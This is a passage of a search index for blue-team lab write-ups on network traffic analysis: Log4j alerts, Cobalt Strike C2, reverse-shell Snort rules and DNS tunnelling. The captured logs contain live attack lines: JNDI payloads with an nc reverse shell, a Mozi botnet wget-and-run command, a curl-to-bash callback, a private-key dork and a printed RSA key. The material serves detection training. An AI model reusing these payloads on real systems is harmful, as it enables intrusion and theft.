    "c": "Log4J  An alert triggered: Log4J Exploitation Attempt . The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. Questions  Investigate the log4shell.pcapng file with detection-log4j.zeek script. zeek -C -r log4shell.pcapng detection-log4j.zeek Investigate the signature.log file. What is the number of signature hits? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat signatures.log | zeek-cut uid | wc -l 3 Investigate the http.log file. Which tool is used for scanning? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut user_agent ... Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) Investigate the http.log file. What is the extension of the exploit file? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut uri | uniq / /ExploitQ8v7ygBW4i.class / /ExploitSMMZvT8GXL.class / /Exploit6HHc3BcVzI.class / testing1 /testing1 /testing123 / Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat log4j.log | zeek-cut value | uniq ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=} ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==} ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==} ${jndi:ldap://127.0.0.1:1389} ${jndi:ldap://192.168.56.102} ${jndi:ldap://192.168.56.102:389} ${jndi:ldap://192.168.56.102:389/test} ${jndi:ldap://192.168.56.102:389} pwned That’s it.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "fb411314a2c585eb9c1fd01afb91f55f",
    "u": "https://nta.tymyrddin.dev/docs/brim/malware",
    "t": "Malware C2 detection ",
    "c": "Malware C2 detection  It is just another malware campaign spread with CobaltStrike. We know an employee clicks on a link, downloads a file, and then network speed issues and anomalous traffic activity arises. Questions  What is the name of the file downloaded from the CobaltStrike C2 connection? _path==\"http\" | cut id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -c 4564.exe What is the number of CobaltStrike connections using port 443? _path==\"conn\" | 104.168.44.45 | 443 | count() 328 There is an additional C2 channel in used the given case. What is the name of the secondary C2 channel? event_type==\"alert\" | cut alert.signature | sort -r | uniq -c | sort -r count IcedID Alert Ai.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "bfa2a1063e780655694e85efc0333463",
    "u": "https://nta.tymyrddin.dev/docs/root-me/ssl",
    "t": "SSL HTTP exchange ",
    "c": "SSL HTTP exchange  root-me challenge SSL - HTTP Exchange : This challenge comes from the 19th DEFCON CTF’s qualification (pkt300). CLUE : “google is your friend : inurl:server.pem…” Google Dorking: inurl:server.pem apple intext:-----BEGIN RSA PRIVATE KEY----- -----BEGIN CERTIFICATE----- MIIDBjCCAm+gAwIBAgIBATANBgkqhkiG9w0BAQQFADB7MQswCQYDVQQGEwJTRzER MA8GA1UEChMITTJDcnlwdG8xFDASBgNVBAsTC00yQ3J5cHRvIENBMSQwIgYDVQQD ExtNMkNyeXB0byBDZXJ0aWZpY2F0ZSBNYXN0ZXIxHTAbBgkqhkiG9w0BCQEWDm5n cHNAcG9zdDEuY29tMB4XDTAwMDkxMDA5NTEzMFoXDTAyMDkxMDA5NTEzMFowUzEL MAkGA1UEBhMCU0cxETAPBgNVBAoTCE0yQ3J5cHRvMRIwEAYDVQQDEwlsb2NhbGhv c3QxHTAbBgkqhkiG9w0BCQEWDm5ncHNAcG9zdDEuY29tMFwwDQYJKoZIhvcNAQEB BQADSwAwSAJBAKy+e3dulvXzV7zoTZWc5TzgApr8DmeQHTYC8ydfzH7EECe4R1Xh 5kwIzOuuFfn178FBiS84gngaNcrFi0Z5fAkCAwEAAaOCAQQwggEAMAkGA1UdEwQC MAAwLAYJYIZIAYb4QgENBB8WHU9wZW5TU0wgR2VuZXJhdGVkIENlcnRpZmljYXRl MB0GA1UdDgQWBBTPhIKSvnsmYsBVNWjj0m3M2z0qVTCBpQYDVR0jBIGdMIGagBT7 hyNp65w6kxXlxb8pUU/+7Sg4AaF/pH0wezELMAkGA1UEBhMCU0cxETAPBgNVBAoT CE0yQ3J5cHRvMRQwEgYDVQQLEwtNMkNyeXB0byBDQTEkMCIGA1UEAxMbTTJDcnlw dG8gQ2VydGlmaWNhdGUgTWFzdGVyMR0wGwYJKoZIhvcNAQkBFg5uZ3BzQHBvc3Qx LmNvbYIBADANBgkqhkiG9w0BAQQFAAOBgQA7/CqT6PoHycTdhEStWNZde7M/2Yc6 BoJuVwnW8YxGO8Sn6UJ4FeffZNcYZddSDKosw8LtPOeWoK3JINjAk5jiPQ2cww++ 7QGG/g5NDjxFZNDJP1dGiLAxPW6JXwov4v0FmdzfLOZ01jDcgQQZqEpYlgpuI5JE WUQ9Ho4EzbYCOQ== -----END CERTIFICATE----- -----BEGIN RSA PRIVATE KEY----- MIIBPAIBAAJBAKy+e3dulvXzV7zoTZWc5TzgApr8DmeQHTYC8ydfzH7EECe4R1Xh 5kwIzOuuFfn178FBiS84gngaNcrFi0Z5fAkCAwEAAQJBAIqm/bz4NA1H++Vx5Ewx OcKp3w19QSaZAwlGRtsUxrP7436QjnREM3Bm8ygU11BjkPVmtrKm6AayQfCHqJoT ZIECIQDW0BoMoL0HOYM/mrTLhaykYAVqgIeJsPjvkEhTFXWBuQIhAM3deFAvWNu4 nklUQ37XsCT2c9tmNt1LAT+slG2JOTTRAiAuXDtC/m3NYVwyHfFm+zKHRzHkClk2 HjubeEgjpj32AQIhAJqMGTaZVOwevTXvvHwNEH+vRWsAYU/gbx+OQB+7VOcBAiEA oolb6NMg/R3enNPvS1O4UU1H8wpaF77L4yiSWlE0p4w= -----END RSA PRIVATE KEY----- -----BEGIN CERTIFICATE REQUEST----- MIIBDTCBuAIBADBTMQswCQYDVQQGEwJTRzERMA8GA1UEChMITTJDcnlwdG8xEjAQ BgNVBAMTCWxvY2FsaG9zdDEdMBsGCSqGSIb3DQEJARYObmdwc0Bwb3N0MS5jb20w XDANBgkqhkiG9w0BAQEFAANLADBIAkEArL57d26W9fNXvOhNlZzlPOACmvwOZ5Ad NgLzJ1/MfsQQJ7hHVeHmTAjM664V+fXvwUGJLziCeBo1ysWLRnl8CQIDAQABoAAw DQYJKoZIhvcNAQEEBQADQQA7uqbrNTjVWpF6By5ZNPvhZ4YdFgkeXFVWi5ao/TaP Vq4BG021fJ9nlHRtr4rotpgHDX1rr+iWeHKsx4+5DRSy -----END CERTIFICATE REQUEST----- Use ssldump : ssldump -dq -r ch5.pcap -k server.pem New TCP connection #1: 192.168.1.5(51663) <-> 192.168.1.9(4433) 1 1 0.0976 (0.0976) C>S SSLv2 compatible client hello 1 2 0.1700 (0.0724) S>C Handshake ServerHello Short read: 0 bytes available (expecting 2) 1 3 0.1700 (0.0000) S>C Handshake Certificate 1 4 0.1700 (0.0000) S>C Handshake ServerHelloDone 1 5 0.1712 (0.0011) C>S Handshake ClientKeyExchange 1 6 0.1712 (0.0000) C>S ChangeCipherSpec 1 7 0.1712 (0.0000) C>S Handshake Finished 1 8 0.2046 (0.0333) S>C ChangeCipherSpec 1 9 0.2046 (0.0000) S>C Handshake Finished 1 10 0.2180 (0.0134) S>C application_data --------------------------------------------------------------- --------------------------------------------------------------- 1 11 0.2180 (0.0000) S>C application_data ... Resources  BlackHat USA 09 Zusman Attack BlackHat USA 09 Marlin Spike Defeat BlackHat USA 09 Zusman Attack Breaking TLS using SSLv2 rfc2246",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "6c7e87d9bfa07501410f7a75e703c79f",
    "u": "https://nta.tymyrddin.dev/docs/root-me/bl-unknown-file",
    "t": "Bluetooth Unknown file ",
    "c": "Bluetooth Unknown file  root-me challenge Bluetooth - Unknown file : Your friend working at NSA recovered an unreadable file from a hacker’s computer. The only thing he knows is that it comes from a communication between a computer and a phone. The answer is the SHA-1 hash of the concatenation of the MAC address (uppercase) and the name of the phone. Example: AB:CD:EF:12:34:56myPhone -> 023cc433c380c2618ed961000a681f1d4c44f8f1 wget the bin from root-me file ch18.bin strings ch18.bin hcidump -r ch18.bin Extract MAC address and phone name, concat Hash it",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a65b64eab58c5b5f7a75dfb2f42cface",
    "u": "https://nta.tymyrddin.dev/docs/snort/reverse-shell",
    "t": "Reverse shell ",
    "c": "Reverse shell  You: J.A.V.A. can you do a quick scan for me? We haven’t investigated the outbound traffic yet. J.A.V.A.: Yes, sir. Outbound traffic investigation has begun. THE NARRATOR: The outbound traffic? Why? YOU: We have stopped some inbound access attempts, so we didn’t let the bad guys get in. How about the bad guys who are already inside? Also, no need to mention the insider risks, huh? The dwell time is still around 1-3 months, and I am quite new here, so it is worth checking the outgoing traffic as well. J.A.V.A.: Sir, persistent outbound traffic is detected. Possibly a reverse shell… YOU: You got it! J.A.V.A.: Sir, you need to observe the traffic with Snort and identify the anomaly first. Then you can create a rule to stop the reverse shell. GOOD LUCK! Start in sniffer mode and capture some data: sudo snort -dev -l . Investigate with the logfile just created: sudo snort -r snort.log.1669602099 Port 4444? $ sudo snort -r snort.log.1669602099 'port 4444' -n 10 ... WARNING: No preprocessors configured for policy 0. 11/28-02:21:39.625212 10.10.144.156:4444 -> 10.10.196.55:54128 TCP TTL:64 TOS:0x0 ID:9999 IpLen:20 DgmLen:52 DF ***A***F Seq: 0x2FE7575D Ack: 0x56C876C1 Win: 0x1E9 TcpLen: 32 TCP Options (3) => NOP NOP TS: 1980585364 2358417664 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 11/28-02:21:39.645400 10.10.196.55:54128 -> 10.10.144.156:4444 TCP TTL:64 TOS:0x0 ID:11389 IpLen:20 DgmLen:52 DF ***A**** Seq: 0x56C876C1 Ack: 0x2FE7575E Win: 0x1EB TcpLen: 32 TCP Options (3) => NOP NOP TS: 2358417665 1980585364 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ TCP port 4444. Metasploit. Create a rule: sudo nano /etc/snort/rules/local.rules # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. drop tcp any 4444 <> any any (msg: \"Reverse Shell Port Detected\"; sid: 100001; rev:1;) Start snort in IPS mode: sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full And flag!",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "db5e4764414f561a8f0d5924aff38cc2",
    "u": "https://nta.tymyrddin.dev/docs/snort/log4j",
    "t": "Log4j ",
    "c": "Log4j  ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local.rules -dev -l . -r log4j.pcap New ruleset: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg:\"Abnormal packet size detected\"; dsize: 770<>855; sid: 100001; rev:1;) ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -d -r snort.log.1669592367 -n 4 Exiting after 4 packets Running in packet dump mode --== Initializing Snort ==-- Initializing Output Plugins! pcap DAQ configured to read-file. Acquiring network traffic from \"snort.log.1669592367\". --== Initialization Complete ==-- ,,_ -*> Snort! <*- o\" )~ Version 2.9.7.0 GRE (Build 149) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.9.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 Commencing packet processing (pid=3237) WARNING: No preprocessors configured for policy 0. 12/11-11:01:34.486776 49.143.32.6:4788 -> 198.71.247.91:80 TCP TTL:49 TOS:0x0 ID:55286 IpLen:20 DgmLen:842 ***AP*** Seq: 0x6C5341A2 Ack: 0x8A162B60 Win: 0xB68 TcpLen: 32 TCP Options (3) => NOP NOP TS: 956236 2733624246 50 4F 53 54 20 2F 48 4E 41 50 31 2F 20 48 54 54 POST /HNAP1/ HTT 50 2F 31 2E 30 0D 0A 48 6F 73 74 3A 20 31 39 38 P/1.0..Host: 198 2E 37 31 2E 32 34 37 2E 39 31 3A 38 30 0D 0A 43 .71.247.91:80..C 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78 ontent-Type: tex 74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 22 t/xml; charset=\" 75 74 66 2D 38 22 0D 0A 53 4F 41 50 41 63 74 69 utf-8\"..SOAPActi 6F 6E 3A 20 68 74 74 70 3A 2F 2F 70 75 72 65 6E on: http://puren 65 74 77 6F 72 6B 73 2E 63 6F 6D 2F 48 4E 41 50 etworks.com/HNAP 31 2F 60 63 64 20 2F 74 6D 70 20 26 26 20 72 6D 1/`cd /tmp && rm 20 2D 72 66 20 2A 20 26 26 20 77 67 65 74 20 68 -rf * && wget h 74 74 70 3A 2F 2F 31 39 32 2E 31 36 38 2E 31 2E ttp://192.168.1. 31 3A 38 30 38 38 2F 4D 6F 7A 69 2E 6D 20 26 26 1:8088/Mozi.m && 20 63 68 6D 6F 64 20 37 37 37 20 2F 74 6D 70 2F chmod 777 /tmp/ 4D 6F 7A 69 2E 6D 20 26 26 20 2F 74 6D 70 2F 4D Mozi.m && /tmp/M 6F 7A 69 2E 6D 60 0D 0A 43 6F 6E 74 65 6E 74 2D ozi.m`..Content- 4C 65 6E 67 74 68 3A 20 36 34 30 0D 0A 0D 0A 3C Length: 640....< 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E ?xml version=\"1. 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 75 74 66 0\" encoding=\"utf 2D 38 22 3F 3E 3C 73 6F 61 70 3A 45 6E 76 65 6C -8\"?><soap:Envel 6F 70 65 20 78 6D 6C 6E 73 3A 78 73 69 3D 22 68 ope xmlns:xsi=\"h 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 ttp://www.w3.org 2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 2D /2001/XMLSchema- 69 6E 73 74 61 6E 63 65 22 20 78 6D 6C 6E 73 3A instance\" xmlns: 78 73 64 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E xsd=\"http://www. 77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53 w3.org/2001/XMLS 63 68 65 6D 61 22 20 78 6D 6C 6E 73 3A 73 6F 61 chema\" xmlns:soa 70 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 p=\"http://schema 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F s.xmlsoap.org/so 61 70 2F 65 6E 76 65 6C 6F 70 65 2F 22 3E 3C 73 ap/envelope/\"><s 6F 61 70 3A 42 6F 64 79 3E 3C 41 64 64 50 6F 72 oap:Body><AddPor 74 4D 61 70 70 69 6E 67 20 78 6D 6C 6E 73 3D 22 tMapping xmlns=\" 68 74 74 70 3A 2F 2F 70 75 72 65 6E 65 74 77 6F http://purenetwo 72 6B 73 2E 63 6F 6D 2F 48 4E 41 50 31 2F 22 3E rks.com/HNAP1/\"> 3C 50 6F 72 74 4D 61 70 70 69 6E 67 44 65 73 63 <PortMappingDesc 72 69 70 74 69 6F 6E 3E 66 6F 6F 62 61 72 3C 2F ription>foobar</ 50 6F 72 74 4D 61 70 70 69 6E 67 44 65 73 63 72 PortMappingDescr 69 70 74 69 6F 6E 3E 3C 49 6E 74 65 72 6E 61 6C iption><Internal 43 6C 69 65 6E 74 3E 31 39 32 2E 31 36 38 2E 30 Client>192.168.0 2E 31 30 30 3C 2F 49 6E 74 65 72 6E 61 6C 43 6C .100</InternalCl 69 65 6E 74 3E 3C 50 6F 72 74 4D 61 70 70 69 6E ient><PortMappin 67 50 72 6F 74 6F 63 6F 6C 3E 54 43 50 3C 2F 50 gProtocol>TCP</P 6F 72 74 4D 61 70 70 69 6E 67 50 72 6F 74 6F 63 ortMappingProtoc 6F 6C 3E 3C 45 78 74 65 72 6E 61 6C 50 6F 72 74 ol><ExternalPort 3E 31 32 33 34 3C 2F 45 78 74 65 72 6E 61 6C 50 >1234</ExternalP 6F 72 74 3E 3C 49 6E 74 65 72 6E 61 6C 50 6F 72 ort><InternalPor 74 3E 31 32 33 34 3C 2F 49 6E 74 65 72 6E 61 6C t>1234</Internal 50 6F 72 74 3E 3C 2F 41 64 64 50 6F 72 74 4D 61 Port></AddPortMa 70 70 69 6E 67 3E 3C 2F 73 6F 61 70 3A 42 6F 64 pping></soap:Bod 79 3E 3C 2F 73 6F 61 70 3A 45 6E 76 65 6C 6F 70 y></soap:Envelop 65 3E 0D 0A 0D 0A e>.... =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ ... ... =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80 TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827 ***AP*** Seq: 0xDC9A621B Ack: 0x9B92AFC8 Win: 0x1F6 TcpLen: 32 TCP Options (3) => NOP NOP TS: 1584792788 1670627000 47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69 3A 6C GET /?x=${jndi:l 64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35 dap://45.155.205 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63 .233:12344/Basic 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F /Command/Base64/ 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75 KGN1cmwgLXMgNDUu 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36 MTU1LjIwNS4yMzM6 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79 NTg3NC8xNjIuMC4y 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33 MjguMjUzOjgwfHx3 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30 Z2V0IC1xIC1PLSA0 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A NS4xNTUuMjA1LjIz 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77 Mzo1ODc0LzE2Mi4w 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70 LjIyOC4yNTM6ODAp 66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50 2F 31 fGJhc2g=} HTTP/1 2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E 37 31 .1..Host: 198.71 2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73 65 72 .247.91:80..User 2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A 2D 6A -Agent: ${${::-j 7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64 7D 24 }${::-n}${::-d}$ 7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D 24 7B {::-i}:${::-l}${ 3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B 3A 3A ::-d}${::-a}${:: 2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35 -p}://45.155.205 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63 .233:12344/Basic 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F /Command/Base64/ 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75 KGN1cmwgLXMgNDUu 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36 MTU1LjIwNS4yMzM6 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79 NTg3NC8xNjIuMC4y 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33 MjguMjUzOjgwfHx3 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30 Z2V0IC1xIC1PLSA0 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A NS4xNTUuMjA1LjIz 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77 Mzo1ODc0LzE2Mi4w 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70 LjIyOC4yNTM6ODAp 66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66 65 72 fGJhc2g=}..Refer 65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C 6F 77 er: ${jndi:${low 65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64 7D 24 er:l}${lower:d}$ 7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77 65 72 {lower:a}${lower 3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35 :p}://45.155.205 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63 .233:12344/Basic 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F /Command/Base64/ 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75 KGN1cmwgLXMgNDUu 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36 MTU1LjIwNS4yMzM6 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79 NTg3NC8xNjIuMC4y 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33 MjguMjUzOjgwfHx3 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30 Z2V0IC1xIC1PLSA0 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A NS4xNTUuMjA1LjIz 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77 Mzo1ODc0LzE2Mi4w 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70 LjIyOC4yNTM6ODAp 66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d633fa6d4bfe0938a062004c4e96ad46",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/tunnels",
    "t": "Tunneling traffic ",
    "c": "Tunneling traffic  Traffic tunnelling is (also known as “port forwarding”) transferring the data/resources in a secure method to network segments and zones. It can be used for “internet to private networks” and “private networks to internet” flow/direction. There is an encapsulation process to hide the data, so the transferred data appear natural for the case, but it contains private data packets and transfers them to the final destination securely. Tunnelling provides anonymity and traffic security and is heavily used by enterprise networks. As it gives a significant level of data encryption, attackers use tunnelling to bypass security perimeters using the standard and trusted protocols used in everyday traffic like ICMP and DNS. It is crucial to have the ability to spot ICMP and DNS anomalies. ICMP analysis  Internet Control Message Protocol (ICMP) is designed for diagnosing and reporting network communication issues. It is used in error reporting and testing. As it is a trusted network layer protocol, sometimes it is used for denial of service (DoS) attacks; also, adversaries use it in data exfiltration and C2 tunnelling activities. Usually, ICMP tunnelling attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. As the ICMP packets can transfer an additional data payload, adversaries use this section to exfiltrate data and establish a C2 connection. It could be a TCP, HTTP or SSH data. As the ICMP protocols provide a great opportunity to carry extra data, it also has disadvantages. Most enterprise networks block custom packets or require administrator privileges to create custom ICMP packets. A large volume of ICMP traffic or anomalous packet sizes are indicators of ICMP tunnelling. And be aware, adversaries can create custom packets that match the regular ICMP packet size (64 bytes), so it is still cumbersome to detect these tunnelling activities. DNS analysis  Domain Name System (DNS) is designed to translate/convert IP domain addresses to IP addresses. It is also known as a phonebook of the internet. As it is the essential part of web services, it is commonly used and trusted, and therefore also often ignored. Due to that, adversaries use it in data exfiltration and C2 activities. Similar to ICMP tunnels, DNS attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. Adversary creates (or already has) a domain address and configures it as a C2 channel. The malware or the commands executed after exploitation sends DNS queries to the C2 server. These queries are longer than default DNS queries and crafted for subdomain addresses. And these subdomain addresses are not actual addresses; they are encoded commands. encoded-commands.maliciousdomain.com When this query is routed to the C2 server, the server sends the actual malicious commands to the host. As the DNS queries are a natural part of the networking activity, these packets have the chance of not being detected by network perimeters. Questions  Use the Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap file. Investigate the anomalous packets. Which protocol is used in ICMP tunnelling? ssh Use the Desktop/exercise-pcaps/dns-icmp/dns.pcap file. Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.) dataexfil[.]com .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8b90023dad7d38f2f274ebd99b792f09",
    "u": "https://nta.tymyrddin.dev/docs/snort/ids-rules",
    "t": "Writing IDS rules ",
    "c": "Writing IDS rules  HTTP  local.rules : # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any 80 (msg: \"HTTP Packet Detected\"; sid: 100001; rev:1;) alert tcp any 80 <> any any (msg: \"HTTP Packet Detected\"; sid: 100002; rev:2;) Get statistics and create a snort.log file: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -c local.rules -dev -l . -r mx-3.pcap =============================================================================== Run time for packet processing was 1.10785 seconds Snort processed 460 packets. Snort ran for 0 days 0 hours 0 minutes 1 seconds Pkts/sec: 460 =============================================================================== Memory usage summary: Total non-mmapped bytes (arena): 2289664 Bytes in mapped regions (hblkhd): 17391616 Total allocated space (uordblks): 2066640 Total free space (fordblks): 223024 Topmost releasable block (keepcost): 65888 =============================================================================== Packet I/O Totals: Received: 460 Analyzed: 460 (100.000%) Dropped: 0 ( 0.000%) Filtered: 0 ( 0.000%) Outstanding: 0 ( 0.000%) Injected: 0 =============================================================================== Breakdown by protocol (includes rebuilt packets): Eth: 460 (100.000%) VLAN: 0 ( 0.000%) IP4: 444 ( 96.522%) Frag: 0 ( 0.000%) ICMP: 272 ( 59.130%) UDP: 8 ( 1.739%) TCP: 164 ( 35.652%) IP6: 0 ( 0.000%) IP6 Ext: 0 ( 0.000%) IP6 Opts: 0 ( 0.000%) Frag6: 0 ( 0.000%) ICMP6: 0 ( 0.000%) UDP6: 0 ( 0.000%) TCP6: 0 ( 0.000%) Teredo: 0 ( 0.000%) ICMP-IP: 0 ( 0.000%) IP4/IP4: 0 ( 0.000%) IP4/IP6: 0 ( 0.000%) IP6/IP4: 0 ( 0.000%) IP6/IP6: 0 ( 0.000%) GRE: 0 ( 0.000%) GRE Eth: 0 ( 0.000%) GRE VLAN: 0 ( 0.000%) GRE IP4: 0 ( 0.000%) GRE IP6: 0 ( 0.000%) GRE IP6 Ext: 0 ( 0.000%) GRE PPTP: 0 ( 0.000%) GRE ARP: 0 ( 0.000%) GRE IPX: 0 ( 0.000%) GRE Loop: 0 ( 0.000%) MPLS: 0 ( 0.000%) ARP: 16 ( 3.478%) IPX: 0 ( 0.000%) Eth Loop: 0 ( 0.000%) Eth Disc: 0 ( 0.000%) IP4 Disc: 0 ( 0.000%) IP6 Disc: 0 ( 0.000%) TCP Disc: 0 ( 0.000%) UDP Disc: 0 ( 0.000%) ICMP Disc: 0 ( 0.000%) All Discard: 0 ( 0.000%) Other: 0 ( 0.000%) Bad Chk Sum: 0 ( 0.000%) Bad TTL: 0 ( 0.000%) S5 G 1: 0 ( 0.000%) S5 G 2: 0 ( 0.000%) Total: 460 =============================================================================== Action Stats: Alerts: 328 ( 71.304%) Logged: 328 ( 71.304%) Passed: 0 ( 0.000%) Limits: Match: 0 Queue: 0 Log: 0 Event: 0 Alert: 0 Verdicts: Allow: 460 (100.000%) Block: 0 ( 0.000%) Replace: 0 ( 0.000%) Whitelist: 0 ( 0.000%) Blacklist: 0 ( 0.000%) Ignore: 0 ( 0.000%) Retry: 0 ( 0.000%) =============================================================================== Snort exiting ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ Investigating packet 63 using the generated snort.log file: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1669574637 -n 63 ... =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 05/13-10:17:09.123830 65.208.228.223:80 -> 145.254.160.237:3372 TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF ***A**** Seq: 0x114C66F0 Ack: 0x38AFFFF3 Win: 0x1920 TcpLen: 20 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ ... Packet 64: =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 05/13-10:17:09.123830 65.208.228.223:80 -> 145.254.160.237:3372 TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF ***A**** Seq: 